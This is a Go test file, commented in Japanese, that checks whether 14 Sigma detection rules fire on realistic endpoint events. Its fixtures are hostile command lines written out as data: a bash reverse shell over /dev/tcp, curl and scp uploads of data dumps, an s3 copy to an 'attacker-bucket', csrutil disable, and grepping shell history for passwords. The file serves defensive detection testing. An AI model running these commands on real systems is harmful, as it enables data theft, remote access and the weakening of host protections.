package detection

import "testing"

// migration 386 が入れた 14 ルール（macOS 9 件・複数 OS 5 件）が、エージェントが
// 実際に出す形のイベントで発火することを確かめる。趣旨は wave1/wave2 と同じ。
//
// このセッションの 3 波を通じて、フィールド解決の検査だけを根拠にしなかった
// 理由が 2 度実証されている:
//
//	第 1 波  SID-History Added (4765/4766) — EventID は既知の名前だが、agent の
//	         購読述語に 4765/4766 が無く、AuthEvent はワイヤ上に EventID を
//	         持たない。**移設を見送った**
//	第 3 波  macOS Sudoers or Passwd Modification — TargetFilename は解決するが、
//	         darwin/file_collector.go の既定監視パスに /etc が無かった。
//	         **収集側に /etc を足して有効化した**（Linux 側は元から /etc を
//	         見ており、非対称の是正でもある）
//
// どちらもフィールド検査は緑である。差が出るのは「値が届くか」だけで、
// それを見るのがこのテストである。
func TestDarkTechniqueWave3RulesFire(t *testing.T) {
	blocks := migrationSigmaBlocks(t)

	cases := []struct {
		title string
		event map[string]interface{}
	}{
		{
			title: "Credential Harvesting from Shell or DB History",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/bin/grep",
				"command_line": `grep -i password /home/v/.bash_history`,
			},
		},
		{
			title: "Unix System Shutdown or Reboot",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/sbin/shutdown",
				"command_line": `shutdown -r now`,
			},
		},
		{
			title: "Exfiltration to Anonymous File-sharing or Paste Site",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/curl",
				"command_line": `curl -F "file=@/data/dump.tar.gz" https://transfer.sh/`,
			},
		},
		{
			title: "Exfiltration to Cloud Storage via Native CLI",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/local/bin/aws",
				"command_line": `aws s3 cp /data/dump.tar.gz s3://attacker-bucket/`,
			},
		},
		{
			title: "Remote Access via VNC Server or Client",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/vncviewer",
				"command_line": `vncviewer 10.0.0.5:5900`,
			},
		},
		{
			title: "macOS Data Exfiltration via curl or scp Upload",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/scp",
				"command_line": `scp -r /Users/v/Documents attacker@10.0.0.5:/tmp/`,
			},
		},
		{
			title: "macOS Disable System Integrity Protection or Firewall",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/csrutil",
				"command_line": `csrutil disable`,
			},
		},
		{
			title: "macOS Kernel Extension Load",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/sbin/kextload",
				"command_line": `kextload /tmp/eve.kext`,
			},
		},
		{
			// darwin/file_collector.go の既定監視 /Library/LaunchAgents 配下
			title: "macOS Launch Agent or Daemon plist File Creation",
			event: map[string]interface{}{
				"type": "file",
				"path": "/Library/LaunchAgents/com.evil.persist.plist",
			},
		},
		{
			title: "macOS Reverse Shell via Shell or netcat",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/bin/bash",
				"command_line": `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`,
			},
		},
		{
			title: "macOS Security Software Discovery",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/pgrep",
				"command_line": `pgrep -f CrowdStrike`,
			},
		},
		{
			// /Users 配下（既定監視）
			title: "macOS Shell Startup File Modification",
			event: map[string]interface{}{
				"type": "file",
				"path": "/Users/v/.zshrc",
			},
		},
		{
			// ★ /etc は本 PR で既定監視パスに足した。足す前はここが空振りする。
			title: "macOS Sudoers or Passwd Modification",
			event: map[string]interface{}{
				"type": "file",
				"path": "/etc/sudoers",
			},
		},
		{
			title: "macOS System and Owner Discovery",
			event: map[string]interface{}{
				"type":         "process",
				"image":        "/usr/bin/whoami",
				"command_line": `whoami`,
			},
		},
	}

	if len(cases) != 14 {
		t.Fatalf("migration 386 は 14 ルールを入れる。ケースが %d 件しかない——"+
			"ルールを足したらここも足すこと", len(cases))
	}

	for _, tc := range cases {
		t.Run(tc.title, func(t *testing.T) {
			blk, ok := blocks[tc.title]
			if !ok {
				t.Fatalf("ルール %q が migration から消えている。改名したなら削除ではなく "+
					"このテストの参照先を張り替えること（守っているのは名前ではなく発火である）", tc.title)
			}

			ev := NewSigmaEvaluator()
			if err := ev.LoadRule(blk.body); err != nil {
				t.Fatalf("%s のロードに失敗: %v", blk.file, err)
			}

			event := make(map[string]interface{}, len(tc.event))
			for k, v := range tc.event {
				event[k] = v
			}
			addPipelineSigmaAliases(event)

			for _, m := range ev.EvaluateEvent(event) {
				if m.RuleTitle == tc.title {
					return
				}
			}
			t.Errorf("%q が発火しなかった。フィールド解決の検査が緑でも、値が届かなければ "+
				"永久に不発火である——このテストはその差を見るために在る。\nイベント: %v",
				tc.title, event)
		})
	}
}
